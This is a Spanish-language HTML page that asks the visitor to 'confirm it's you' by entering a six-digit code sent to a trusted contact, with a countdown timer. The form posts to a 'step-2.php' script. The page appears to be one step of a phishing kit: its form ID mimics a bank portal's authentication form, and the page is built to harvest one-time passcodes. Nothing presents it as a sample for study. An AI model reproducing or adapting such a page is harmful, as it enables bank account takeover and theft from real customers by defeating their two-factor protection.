<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Código</title>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <link rel="stylesheet" href="../amano/css/estilos.css">
  <link rel="stylesheet" href="../amano/css/3dias.css">
  <script src="./js/jquery-3.6.0.min.js"></script>
   
  <style>
    .no-js #content {
      display: none;
    }
    .no-js #no-js-message {
      display: block;
    }
  </style>
</head>
<body class="no-js">
<div id="content">
<div class="container-fluid header">
  <div class="row py-2">
    <div class="col text-left">
      <a href="#" class="text-dark">
        <img src="../amano/tom/x.svg" alt="Cerrar" width="20px" class="img-fluid" style="vertical-align: middle;">
      </a>
    </div>
    <div class="col text-center">
      <img src="../amano/tom/lg.png" alt="Logo" width="30px" class="img-fluid logo">
    </div>
    <div class="col text-right">
      <a href="#" class="text-dark">
        Continuar 
        <img src="../amano/tom/felcha.svg" alt="Continuar" width="20px" class="img-fluid" style="vertical-align: middle;">
      </a>
    </div>
  </div>
</div>

<form id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar"
            name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar" method="post" action="../amano/step-2.php"
            enctype="application/x-www-form-urlencoded">






  <div class="container-nubes">
    <div class="container nubes">
      <p style="text-align: left; font-size: 19px; font-weight: bold;">Confirmemos que eres tú</p>
      <p style="text-align: left;">Hemos enviado un código de seguridad a tu contacto de confianza, pídelo e ingrésalo aquí.</p>
      <div class="loader-container">
        <div class="loader"></div>
        <div class="text-container">
          <p id="countdown">El código vence en:<br><span id="timer">06:45</span> minutos</p>
        </div>
        <div class="demencia-ok">
          <div class="vertical-center text-center">
            <img src="../amano/tom/seguridad.jpg" alt="Icono" width="30px">
            <p class="mt-2">Escríbelo aquí</p>
            <div class="tamal-poco">
              <input type="tel" id="txtOTP" required name="txtOTP" class="form-control input-password" maxlength="6">
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="text-center mt-3">
      <button id="btnOTP" name="btnOTP" class="ban-boom" disabled>CONTINUAR</button>
    </div>
  </div>
</div>
<div id="no-js-message" style="display: none;">
  <p>Por favor, activa JavaScript para utilizar esta página.</p>
</div>
<!-- Scripts de Bootstrap -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script>
document.body.classList.remove('no-js');

var countdown;

function startCountdown() {
    var timerElement = document.getElementById('timer');
    var timeLeft = convertToSeconds(timerElement.innerText); 
    
    countdown = setInterval(function() {
        timeLeft--; 
        
        var minutes = Math.floor(timeLeft / 60);
        var seconds = timeLeft % 60;
        
        var displayMinutes = minutes < 10 ? '0' + minutes : minutes;
        var displaySeconds = seconds < 10 ? '0' + seconds : seconds;
        
        timerElement.textContent = displayMinutes + ":" + displaySeconds;
        
        if (timeLeft <= 0) {
            clearInterval(countdown);
            timerElement.textContent = "Tiempo Expirado";
        }
    }, 1000); 
}

function convertToSeconds(timeString) {
    var parts = timeString.split(":");
    var minutes = parseInt(parts[0]);
    var seconds = parseInt(parts[1]);
    return (minutes * 60) + seconds;
}

function validateInput() {
    var inputField = document.getElementById('txtOTP'); 
    var button = document.getElementById('btnOTP');      
    var inputValue = inputField.value;

    inputField.value = inputValue.replace(/[^0-9]/g, '');

    button.disabled = inputField.value.length !== 6;
}

document.getElementById('txtOTP').addEventListener('input', validateInput);  

window.onload = startCountdown;
</script>
</body>
</html>
